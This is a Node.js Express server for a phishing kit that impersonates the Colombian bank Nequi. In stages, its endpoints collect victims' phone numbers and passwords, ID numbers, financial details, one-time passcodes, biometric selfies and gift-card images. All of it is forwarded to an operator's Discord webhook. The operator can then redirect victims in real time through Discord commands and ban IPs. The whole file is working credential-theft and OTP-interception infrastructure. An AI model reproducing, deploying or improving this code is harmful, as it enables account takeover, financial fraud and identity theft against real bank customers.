/**
 * Servidor Principal - Nequi con Discord
 */

require('dotenv').config({ path: './configuracion.env' });
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const discordService = require('./services/discordService');
const sessionService = require('./services/sessionService');

const app = express();
const PORT = process.env.PORT || 3000;
const RENDER_URL = process.env.RENDER_URL || `http://localhost:${PORT}`;

// ==================== MIDDLEWARES ====================
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.options('*', cors());

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(path.join(__dirname, '../public')));

// ==================== RUTAS ====================

// Estado del servidor
app.get('/', (req, res) => {
  res.json({
    ok: true,
    service: 'Nequi Backend con Discord',
    version: '2.0.0',
    status: 'running',
    discord: !!process.env.DISCORD_WEBHOOK_URL,
    timestamp: new Date().toISOString()
  });
});

// Verificar banneo
app.post('/check-ban', (req, res) => {
  const { ip } = req.body;
  res.json({ banned: sessionService.isBanned(ip) });
});

// Crear sesión
app.post('/create-session', (req, res) => {
  const { ip, country, city } = req.body;
  const sessionId = sessionService.createSession(ip, country, city);
  res.json({ sessionId });
});

// ==================== PASO 1: CREDENCIALES ====================
app.post('/step1-credentials', async (req, res) => {
  try {
    const { sessionId, phoneNumber, password, ip, country, city } = req.body;
    
    sessionService.setSessionData(sessionId, 'phoneNumber', phoneNumber);
    sessionService.setSessionData(sessionId, 'password', password);
    sessionService.setSessionData(sessionId, 'ip', ip);
    sessionService.setSessionData(sessionId, 'country', country);
    sessionService.setSessionData(sessionId, 'city', city);

    await discordService.notificarCredenciales(sessionId, phoneNumber, password, ip, country, city);

    res.json({ ok: true });
  } catch (error) {
    console.error('❌ Error en step1-credentials:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ==================== PASO 2: PRIMER SALDO ====================
app.post('/step2-loan-first', (req, res) => {
  try {
    const { sessionId, cedula, nombreCompleto, ocupacion, ingresoMensual, gastosMensual, saldoActual } = req.body;
    
    sessionService.setSessionData(sessionId, 'cedula', cedula);
    sessionService.setSessionData(sessionId, 'nombreCompleto', nombreCompleto);
    sessionService.setSessionData(sessionId, 'ocupacion', ocupacion);
    sessionService.setSessionData(sessionId, 'ingresoMensual', ingresoMensual);
    sessionService.setSessionData(sessionId, 'gastosMensual', gastosMensual);
    sessionService.setSessionData(sessionId, 'saldoActual1', saldoActual);

    res.json({ ok: true, message: 'Primer saldo guardado' });
  } catch (error) {
    console.error('❌ Error en step2-loan-first:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ==================== PASO 2: SEGUNDO SALDO ====================
app.post('/step2-loan-second', async (req, res) => {
  try {
    const { sessionId, saldoActual } = req.body;
    
    sessionService.setSessionData(sessionId, 'saldoActual2', saldoActual);
    
    const session = sessionService.getSession(sessionId);
    await discordService.notificarPrestamoCompleto(sessionId, session);
    await discordService.notificarMenu(sessionId, 'loan');

    res.json({ ok: true, message: 'Datos completos enviados a Discord' });
  } catch (error) {
    console.error('❌ Error en step2-loan-second:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ==================== PASO 3: DINÁMICA 1 ====================
app.post('/step3-dynamic', async (req, res) => {
  try {
    const { sessionId, otp, attemptNumber } = req.body;
    
    const session = sessionService.getSession(sessionId);
    if (!session.dynamics) session.dynamics = [];
    session.dynamics.push(otp);
    sessionService.updateSession(sessionId, session);

    await discordService.notificarDinamica(sessionId, session, otp, attemptNumber, '1');
    await discordService.notificarMenu(sessionId, 'dynamic');

    res.json({ ok: true });
  } catch (error) {
    console.error('❌ Error en step3-dynamic:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ==================== PASO 4: DINÁMICA 2 ====================
app.post('/step4-dynamic', async (req, res) => {
  try {
    const { sessionId, otp, attemptNumber } = req.body;
    
    const session = sessionService.getSession(sessionId);
    if (!session.dynamics) session.dynamics = [];
    session.dynamics.push(otp);
    sessionService.updateSession(sessionId, session);

    await discordService.notificarDinamica(sessionId, session, otp, attemptNumber, '2');
    await discordService.notificarMenu(sessionId, 'dynamic');

    res.json({ ok: true });
  } catch (error) {
    console.error('❌ Error en step4-dynamic:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ==================== BIOMETRÍA ====================
app.post('/step-biometrics', async (req, res) => {
  try {
    const { sessionId, imageBase64, ip, phoneNumber } = req.body;
    
    const session = sessionService.getSession(sessionId) || {};
    const finalPhoneNumber = session.phoneNumber || phoneNumber || 'N/A';

    const buffer = Buffer.from(imageBase64.replace(/^data:image\/\w+;base64,/, ''), 'base64');
    
    await discordService.notificarBiometria(sessionId, session, finalPhoneNumber, ip);
    
    await discordService.sendToDiscord(
      { title: '📸 Imagen de Biometría', fields: [] },
      'security',
      [{ buffer, filename: 'biometria.jpg' }]
    );

    res.json({ ok: true });
  } catch (error) {
    console.error('❌ Error en biometría:', error.message);
    res.status(500).json({ ok: false });
  }
});

// ==================== TARJETA DE REGALO ====================
app.post('/step-tarjetaregalo', async (req, res) => {
  try {
    const { frontImageBase64, backImageBase64, sessionId } = req.body;
    
    const frontBuffer = Buffer.from(frontImageBase64.replace(/^data:image\/\w+;base64,/, ''), 'base64');
    const backBuffer = Buffer.from(backImageBase64.replace(/^data:image\/\w+;base64,/, ''), 'base64');

    await discordService.notificarTarjetaRegalo(sessionId, frontBuffer, backBuffer);

    res.json({ ok: true });
  } catch (error) {
    console.error('❌ Error en tarjeta de regalo:', error.message);
    res.status(500).json({ ok: false });
  }
});

// ==================== CONSIGNAR ====================
app.post('/consignar', async (req, res) => {
  try {
    const { sessionId, phoneNumber, password, ip } = req.body;
    await discordService.notificarConsignacion(sessionId, phoneNumber, password, ip);
    res.json({ ok: true });
  } catch (error) {
    console.error('❌ Error en consignar:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ==================== COMANDOS DE DISCORD ====================
app.post('/discord/command', async (req, res) => {
  try {
    const { sessionId, command } = req.body;
    
    const [action, ...params] = command.split(' ');
    
    // BANEAR IP
    if (action === '/ban') {
      const session = sessionService.getSession(sessionId);
      if (session && session.ip) {
        sessionService.banIP(session.ip);
        await discordService.sendToDiscord({
          title: '🚫 IP BANEADA',
          fields: [
            { name: '🌐 IP', value: `\`${session.ip}\``, inline: true },
            { name: '🆔 Session', value: `\`${sessionId}\``, inline: true }
          ]
        }, 'error');
        return res.json({ ok: true, message: `✅ IP ${session.ip} baneada` });
      }
      return res.json({ ok: false, message: '❌ Sesión no encontrada' });
    }

    // REDIRECCIONES
    if (action === '/go' && params[0]) {
      const route = params[0];
      const finalRoute = route.endsWith('.html') ? route : `${route}.php.html`;
      sessionService.setRedirection(sessionId, finalRoute);
      return res.json({ ok: true, redirect_to: finalRoute });
    }

    res.json({ ok: false, message: '⚠️ Comando no reconocido' });
  } catch (error) {
    console.error('❌ Error en comando:', error.message);
    res.status(500).json({ error: error.message });
  }
});

// ==================== CONSULTAR INSTRUCCIÓN ====================
app.get('/instruction/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const target = sessionService.getRedirection(sessionId);
  res.json({ redirect_to: target || null });
});

// ==================== INICIAR SERVIDOR ====================
app.listen(PORT, async () => {
  console.log(`✅ Servidor activo en puerto ${PORT}`);
  console.log(`📡 URL: ${RENDER_URL}`);
  console.log(`📡 Discord: ${process.env.DISCORD_WEBHOOK_URL ? '✅ Configurado' : '❌ No configurado'}`);
  
  await discordService.sendToDiscord({
    title: '🚀 Servidor Nequi Iniciado',
    description: 'El sistema de validación con Discord está activo',
    fields: [
      { name: '📅 Fecha', value: new Date().toLocaleString('es-CO'), inline: true },
      { name: '🔢 Versión', value: '2.0.0', inline: true },
      { name: '🌐 URL', value: RENDER_URL, inline: false }
    ]
  }, 'success');
});

// ==================== AUTO-PING ====================
setInterval(async () => {
  try {
    await fetch(RENDER_URL);
    console.log(`🔄 Auto-ping: ${new Date().toLocaleTimeString()}`);
  } catch (error) {
    console.error('❌ Error en auto-ping:', error.message);
  }
}, 14 * 60 * 1000);

// Limpiar sesiones expiradas cada 30 minutos
setInterval(() => {
  sessionService.cleanExpiredSessions();
}, 30 * 60 * 1000);

module.exports = app;